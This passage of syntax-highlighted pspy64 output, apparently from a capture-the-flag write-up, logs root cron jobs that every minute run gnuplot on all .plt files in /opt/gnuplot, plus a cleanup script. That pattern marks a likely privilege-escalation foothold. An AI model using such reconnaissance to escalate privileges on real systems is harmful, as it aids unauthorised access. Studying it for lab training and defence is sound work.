</span></span><span style="display:flex;"><span>    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
</span></span><span style="display:flex;"><span>    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
</span></span><span style="display:flex;"><span>    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
</span></span><span style="display:flex;"><span>                   ░           ░ ░     
</span></span><span style="display:flex;"><span>                               ░ ░     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Config: Printing events <span style="color:#f92672">(</span>colored<span style="color:#f92672">=</span>true<span style="color:#f92672">)</span>: processes<span style="color:#f92672">=</span>true | file-system-events<span style="color:#f92672">=</span>false <span style="color:#f92672">||</span>| Scanning <span style="color:#66d9ef">for</span> processes every 100ms and on inotify events <span style="color:#f92672">||</span>| Watching directories: <span style="color:#f92672">[</span>/usr /tmp /etc /home /var /opt<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>recursive<span style="color:#f92672">)</span> | <span style="color:#f92672">[]</span> <span style="color:#f92672">(</span>non-recursive<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Draining file system events due to startup...
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">1007</span>  PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22916</span>  | ./pspy64 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22904</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22697</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22696</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22695</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22694</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22693</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22692</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>2023/07/08 13:09:44 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">33</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22691</span>  | /usr/sbin/apache2 -k start 
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22927</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22926</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22931</span>  | find /opt/gnuplot -name *.plt -mmin +5 -mmin -300 -exec /usr/bin/rm -rf <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22930</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22929</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -mmin +5 -mmin -300 -exec /usr/bin/rm -rf <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22932</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22933</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22939</span>  | cut -d   -f3,7 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22938</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22937</span>  | grep enp 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22936</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22935</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22934</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22943</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22942</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22941</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22940</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22945</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:10:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22946</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:00 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22951</span>  | /lib/systemd/systemd-udevd 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:00 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22950</span>  | /lib/systemd/systemd-udevd 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:00 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22949</span>  | /lib/systemd/systemd-udevd 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22955</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22954</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22953</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22952</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22961</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22960</span>  | cut -d   -f3,7 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22959</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22958</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22956</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22962</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:11:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22969</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22971</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22970</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22973</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22972</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22977</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22976</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22975</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22974</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22980</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22979</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22978</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22982</span>  | grep -o load average:.*$ 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22981</span>  | uptime 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22984</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22983</span>  | cut -d  -f <span style="color:#ae81ff">3</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22985</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22986</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:12:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22987</span>  | gnuplot /opt/gnuplot/networkplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22990</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22989</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22988</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22991</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22994</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22993</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22992</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22998</span>  | cut -d   -f3,7 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22997</span>  | tr -s   
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22996</span>  | grep enp 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23002</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23001</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23000</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">22999</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23004</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:13:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23005</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23007</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23006</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23011</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23010</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23009</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23008</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23016</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23015</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23014</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23012</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23021</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23022</span>  | tail -60 /opt/gnuplot/loaddata.dat 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:52 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23025</span>  | /lib/systemd/systemd-udevd 
</span></span><span style="display:flex;"><span>2023/07/08 13:14:52 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23024</span>  | /lib/systemd/systemd-udevd 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23029</span>  | find /opt/gnuplot -name *.plt -exec gnuplot <span style="color:#f92672">{}</span> ; 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23028</span>  | /bin/sh -c find <span style="color:#e6db74">&#34;/opt/gnuplot&#34;</span> -name <span style="color:#e6db74">&#34;*.plt&#34;</span> -exec gnuplot <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23027</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23026</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23031</span>  | /usr/sbin/CRON -f 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23030</span>  | gnuplot /opt/gnuplot/loadplot.plt 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23036</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23035</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23034</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23033</span>  | netstat -i 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23032</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23037</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23041</span>  | sed s/,//g 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23040</span>  | cut -d  -f <span style="color:#ae81ff">3</span> 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23039</span>  | /bin/sh /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23038</span>  | uptime 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23042</span>  | tail -60 /opt/gnuplot/netdata.dat 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23043</span>  | tail -60 /opt/gnuplot/loaddata.dat 
</span></span><span style="display:flex;"><span>2023/07/08 13:15:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23044</span>  | 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23051</span>  | /bin/sh -c /opt/gnuplot/getdata.sh 
</span></span><span style="display:flex;"><span>2023/07/08 13:16:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">23050</span>  | /usr/sbin/CRON -f 
